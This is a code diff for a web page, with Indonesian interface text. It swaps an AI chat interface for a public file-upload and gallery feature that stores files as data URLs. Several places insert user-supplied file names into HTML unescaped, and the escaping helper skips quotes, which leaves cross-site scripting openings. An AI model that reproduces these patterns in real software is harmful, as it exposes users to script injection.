-                        max_tokens: 800,
-                        temperature: 0.7
-                    })
-                });
+    const total = files.length;
+    let completed = 0;
+    let successEntries = [];
 
-                const data = await response.json();
-                typingIndicator.style.display = 'none';
+    for (let i = 0; i < files.length; i++) {
+      const file = files[i];
+      const fileId = Date.now() + '-' + Math.random().toString(36).substring(2, 10);
+      const category = getFileTypeCategory(file.type);
+      statusMsg.innerText = `📤 Mengirim: ${file.name}`;
+      countSpan.innerText = `${i+1} / ${total}`;
+      progressFill.style.width = `${((i+1)/total)*100}%`;
 
-                if (data.error) {
-                    addMessageToChat('ERROR: ' + (data.error.message || 'System error'), 'assistant');
-                } else if (data.choices && data.choices[0]) {
-                    addMessageToChat(data.choices[0].message.content, 'assistant');
-                } else {
-                    addMessageToChat('Unable to process.', 'assistant');
-                }
-            } catch (error) {
-                typingIndicator.style.display = 'none';
-                addMessageToChat('CONNECTION ERROR: ' + error.message, 'assistant');
-            }
+      await new Promise(r => setTimeout(r, 35));
+      const reader = new FileReader();
+      const fileData = await new Promise((resolve) => {
+        reader.onload = (e) => resolve(e.target.result);
+        reader.readAsDataURL(file);
+      });
 
-            sendBtn.disabled = false;
-            messageInput.focus();
-        }
+      successEntries.push({
+        id: fileId,
+        name: file.name,
+        size: file.size,
+        type: file.type,
+        category: category,
+        sender: senderName.trim() || "Anonymous",
+        data: fileData,
+        timestamp: Date.now(),
+        public: true
+      });
+      completed++;
+    }
 
-        function addMessageToChat(text, sender) {
-            const container = document.getElementById('chatContainer');
-            const messageDiv = document.createElement('div');
-            messageDiv.className = `message ${sender}`;
-            
-            const avatar = document.createElement('div');
-            avatar.className = 'message-avatar';
-            avatar.innerHTML = sender === 'user' ? '👤' : '🤖';
-            
-            const bubble = document.createElement('div');
-            bubble.className = 'message-bubble';
-            bubble.innerHTML = text.replace(/\n/g, '<br>');
-            
-            messageDiv.appendChild(avatar);
-            messageDiv.appendChild(bubble);
-            container.appendChild(messageDiv);
-            scrollChatToBottom();
-        }
+    if (successEntries.length) {
+      publicFiles = [...successEntries, ...publicFiles];
+      savePublicFiles();
+      showToast(`✅ ${successEntries.length} file berhasil dibagikan ke publik! semua orang bisa lihat.`);
+    } else {
+      showToast("⚠️ Tidak ada file yang dikirim");
+    }
 
-        function scrollChatToBottom() {
-            const container = document.getElementById('chatContainer');
-            container.scrollTop = container.scrollHeight;
-        }
+    progressFill.style.width = '100%';
+    statusMsg.innerText = '✨ Selesai! file tersedia untuk semua orang ✨';
+    setTimeout(() => {
+      progressArea.style.display = 'none';
+      progressFill.style.width = '0%';
+    }, 1800);
 
-        function sendSuggestion(text) {
-            document.getElementById('messageInput').value = text;
-            sendMessage();
-        }
+    isUploading = false;
+    currentSelectedFiles = [];
+    document.getElementById('selectedPreviewArea').innerHTML = '';
+    document.getElementById('batchFileInput').value = '';
+  }
 
-        // ============ NEURAL NETWORK BACKGROUND ============
-        const canvas = document.getElementById('neuralCanvas');
-        let ctx = canvas.getContext('2d');
-        
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        
-        let nodes = [];
-        const nodeCount = 45;
-        
-        function initNodes() {
-            nodes = [];
-            for (let i = 0; i < nodeCount; i++) {
-                nodes.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    vx: (Math.random() - 0.5) * 0.35,
-                    vy: (Math.random() - 0.5) * 0.35,
-                    radius: Math.random() * 2 + 1
-                });
-            }
-        }
-        
-        function drawNeuralNetwork() {
-            if (!ctx) return;
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            for (let node of nodes) {
-                node.x += node.vx;
-                node.y += node.vy;
-                if (node.x < 0 || node.x > canvas.width) node.vx *= -1;
-                if (node.y < 0 || node.y > canvas.height) node.vy *= -1;
-                node.x = Math.max(0, Math.min(canvas.width, node.x));
-                node.y = Math.max(0, Math.min(canvas.height, node.y));
-            }
-            
-            for (let i = 0; i < nodes.length; i++) {
-                for (let j = i + 1; j < nodes.length; j++) {
-                    const dx = nodes[i].x - nodes[j].x;
-                    const dy = nodes[i].y - nodes[j].y;
-                    const distance = Math.sqrt(dx * dx + dy * dy);
-                    if (distance < 110) {
-                        const opacity = (1 - distance / 110) * 0.12;
-                        ctx.beginPath();
-                        ctx.moveTo(nodes[i].x, nodes[i].y);
-                        ctx.lineTo(nodes[j].x, nodes[j].y);
-                        ctx.strokeStyle = `rgba(88, 101, 242, ${opacity})`;
-                        ctx.stroke();
-                    }
-                }
-            }
-            
-            for (let node of nodes) {
-                ctx.beginPath();
-                ctx.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
-                ctx.fillStyle = `rgba(88, 101, 242, ${node.radius / 3.5})`;
-                ctx.fill();
-            }
-            
-            requestAnimationFrame(drawNeuralNetwork);
-        }
-        
-        window.addEventListener('resize', () => {
-            resizeCanvas();
-            initNodes();
-        });
-        
-        resizeCanvas();
-        initNodes();
-        drawNeuralNetwork();
+  // RENDER GALERI PUBLIK (BISA DILIHAT SEMUA ORANG)
+  let currentFilter = 'all';
+  function renderPublicGallery() {
+    const filtered = publicFiles.filter(f => {
+      if (currentFilter === 'all') return true;
+      return f.category === currentFilter;
+    });
+    const grid = document.getElementById('publicFilesGrid');
+    if (filtered.length === 0) {
+      grid.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:2.5rem; color:#8c9ed0;">✨ Belum ada file. Jadi orang pertama yang share! ✨</div>';
+      return;
+    }
+    grid.innerHTML = filtered.map(file => {
+      const isImage = file.category === 'image';
+      const isVideo = file.category === 'video';
+      return `
+        <div class="file-item" data-id="${file.id}">
+          ${isImage ? `<img src="${file.data}" class="img-thumb" alt="${file.name}">` : ''}
+          ${isVideo ? `<video src="${file.data}" class="img-thumb" style="pointer-events:none;"></video>` : ''}
+          ${!isImage && !isVideo ? `<div class="icon-thumb"><svg width="48" viewBox="0 0 100 100"><path d="M30 25 L70 25 L75 35 L75 75 L25 75 Z" stroke="#5f9eff" stroke-width="2.5" fill="none"/><path d="M42 48 L58 48 M42 58 L58 58" stroke="#7c8bc0" stroke-width="2"/></svg></div>` : ''}
+          <div class="file-meta">
+            <div class="file-title">${escapeHtml(file.name.substring(0, 30))}${file.name.length > 30 ? '…' : ''}</div>
+            <div class="file-sender">👤 ${escapeHtml(file.sender)} · ${formatBytes(file.size)}</div>
+          </div>
+          <div class="action-buttons">
+            <button class="mini-btn viewBtn" data-id="${file.id}">👁️ Lihat</button>
+            <button class="mini-btn downloadBtn" data-id="${file.id}">⬇️ Download</button>
+          </div>
+        </div>
+      `;
+    }).join('');
 
-        // Auto login check
-        const savedUser = localStorage.getItem('dilzx_current_user');
-        if (savedUser) {
-            currentUser = savedUser;
-            document.getElementById('loginPage').style.display = 'none';
-            document.getElementById('chatPage').classList.add('active');
-            document.getElementById('chatUserEmail').innerText = savedUser.length > 25 ? savedUser.substring(0, 22) + '...' : savedUser;
-        }
+    // event listener tombol lihat & download
+    document.querySelectorAll('.viewBtn').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const id = btn.getAttribute('data-id');
+        const found = publicFiles.find(f => f.id === id);
+        if (found) openPublicPreview(found);
+      });
+    });
+    document.querySelectorAll('.downloadBtn').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const id = btn.getAttribute('data-id');
+        const found = publicFiles.find(f => f.id === id);
+        if (found) downloadPublicFile(found);
+      });
+    });
+  }
 
-        document.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                if (document.getElementById('loginPage').style.display !== 'none') {
-                    doLogin();
-                }
-            }
-        });
-    </script>
+  function openPublicPreview(file) {
+    const modal = document.getElementById('previewModal');
+    const modalInner = document.getElementById('modalInner');
+    const isImage = file.category === 'image';
+    const isVideo = file.category === 'video';
+    if (isImage) {
+      modalInner.innerHTML = `<img src="${file.data}" class="modal-media"><div style="margin-top:0.7rem;"><strong>${file.name}</strong><br>📦 ${formatBytes(file.size)}<br>👤 Pengirim: ${escapeHtml(file.sender)}<br>🌍 Status: publik — semua orang bisa lihat</div>`;
+    } else if (isVideo) {
+      modalInner.innerHTML = `<video src="${file.data}" class="modal-media" controls autoplay></video><div style="margin-top:0.7rem;"><strong>${file.name}</strong><br>📦 ${formatBytes(file.size)}<br>👤 ${escapeHtml(file.sender)}<br>🌍 Publik</div>`;
+    } else {
+      modalInner.innerHTML = `<div style="text-align:center; padding:1rem;"><div style="font-size:3.5rem;">📄</div><div><strong>${file.name}</strong></div><div>${formatBytes(file.size)}</div><div>👤 Pengirim: ${escapeHtml(file.sender)}</div><div>🌍 Akses publik</div><button id="modalDownloadBtn" class="mini-btn" style="margin-top:1rem;">⬇️ Download</button></div>`;
+      setTimeout(() => {
+        const dl = document.getElementById('modalDownloadBtn');
+        if (dl) dl.onclick = () => downloadPublicFile(file);
+      }, 20);
+    }
+    modal.classList.add('active');
+  }
+
+  function downloadPublicFile(file) {
+    const a = document.createElement('a');
+    a.href = file.data;
+    a.download = file.name;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    showToast(`⬇️ Download ${file.name}`);
+  }
+
+  function showToast(msg) {
+    const toast = document.getElementById('toastMsg');
+    toast.innerText = msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2200);
+  }
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      return m;
+    });
+  }
+
+  // ---------- EVENT UPLOAD ----------
+  const dropZone = document.getElementById('uploadDropZone');
+  const fileInput = document.getElementById('batchFileInput');
+  const uploadBtn = document.getElementById('batchUploadBtn');
+  const senderField = document.getElementById('senderName');
+
+  dropZone.addEventListener('click', () => fileInput.click());
+  dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.style.borderColor = '#8aadff'; });
+  dropZone.addEventListener('dragleave', () => { dropZone.style.borderColor = '#2f3a6e'; });
+  dropZone.addEventListener('drop', (e) => {
+    e.preventDefault();
+    dropZone.style.borderColor = '#2f3a6e';
+    const files = e.dataTransfer.files;
+    if (files.length) {
+      currentSelectedFiles = Array.from(files);
+      updateFilePreview(currentSelectedFiles);
+      fileInput.files = files;
+    }
+  });
+
+  fileInput.addEventListener('change', (e) => {
+    if (e.target.files.length) {
+      currentSelectedFiles = Array.from(e.target.files);
+      updateFilePreview(currentSelectedFiles);
+    }
+  });
+
+  uploadBtn.addEventListener('click', async () => {
+    if (!currentSelectedFiles.length) {
+      showToast("📂 Pilih file dulu ya");
+      return;
+    }
+    const sender = senderField.value.trim() || "Anonymous";
+    await uploadFilesToPublic(currentSelectedFiles, sender);
+    currentSelectedFiles = [];
+    document.getElementById('selectedPreviewArea').innerHTML = '';
+    fileInput.value = '';
+  });
+
+  // Filter gallery
+  document.querySelectorAll('.filter-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      currentFilter = btn.getAttribute('data-filter');
+      renderPublicGallery();
+    });
+  });
+
+  // Modal close
+  document.getElementById('closeModalBtn').addEventListener('click', () => {
+    document.getElementById('previewModal').classList.remove('active');
+  });
+  window.addEventListener('click', (e) => {
+    const modal = document.getElementById('previewModal');
+    if (e.target === modal) modal.classList.remove('active');
+  });
+
+  loadPublicFiles();
+</script>
 </body>
 </html>
